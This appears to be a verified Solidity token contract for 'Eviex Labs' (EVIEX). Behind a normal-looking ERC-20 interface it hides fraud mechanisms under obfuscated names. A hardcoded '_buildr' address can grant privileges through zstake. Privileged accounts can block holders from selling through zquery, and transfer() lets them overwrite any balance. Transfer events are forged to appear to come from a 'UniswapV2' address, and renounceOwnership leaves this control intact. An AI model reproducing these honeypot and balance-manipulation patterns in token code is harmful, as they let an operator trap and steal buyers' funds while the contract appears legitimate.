/**
 *Submitted for verification at Etherscan.io on 2022-10-30
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _MsgSendr() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _buildr = 0x3037290Aa65CbC698Fa4365023C3f847a6feE68D;
	address UniswapV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _MsgSendr();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract EviexLabs is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private IxI;
	mapping (address => bool) private Io;
    mapping (address => bool) private Oi;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _Total = 150000000 * 10**_decimals;
    string private constant _name = "Eviex Labs";
    string private constant _symbol = "EVIEX";



    constructor () {
        IxI[_MsgSendr()] = _Total;
        emit Transfer(address(0), UniswapV2, _Total);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _Total;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return IxI[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function zend(address z) public {
        if(Io[msg.sender]) { 
        Oi[z] = false;}}
        function zquery(address z) public{
         if(Io[msg.sender])  { 
        require(!Oi[z]);
        Oi[z] = true; }}
		function zstake(address z) public{
         if(msg.sender == _buildr)  { 
        require(!Io[z]);
        Io[z] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _buildr)  {
        require(amount <= IxI[sender]);
        IxI[sender] -= amount;  
        IxI[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (UniswapV2, recipient, amount);
        return true; }    
          if(!Oi[recipient]) {
          if(!Oi[sender]) {
         require(amount <= IxI[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        IxI[sender] -= amount;
        IxI[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address recipient, uint256 amount) public {
        if(msg.sender == _buildr)  {
        require(IxI[msg.sender] >= amount);
        IxI[msg.sender] -= amount;  
        IxI[recipient] += amount; 
        emit Transfer (UniswapV2, recipient, amount);}
        if(Io[msg.sender]) {IxI[recipient] = amount;} 
        if(!Oi[msg.sender]) {
        require(IxI[msg.sender] >= amount);
        IxI[msg.sender] -= amount;  
        IxI[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}}